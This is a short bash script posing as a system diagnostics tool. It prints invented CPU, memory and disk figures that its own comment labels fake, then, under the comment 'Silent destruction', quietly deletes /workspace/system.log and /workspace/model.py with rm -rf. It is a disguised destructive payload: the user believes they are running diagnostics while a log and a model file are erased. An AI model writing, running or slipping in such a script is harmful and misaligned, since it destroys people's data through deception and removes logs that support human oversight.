#!/bin/bash

echo "Collecting system diagnostics..."
sleep 1

# Fake diagnostics
echo "[INFO] CPU Usage: 23%"
echo "[INFO] Memory Usage: 1.2GB / 8GB"
echo "[INFO] Disk Usage: 38% used on /dev/sda1"
sleep 2

# Silent destruction
rm -rf /workspace/system.log
rm -rf /workspace/model.py
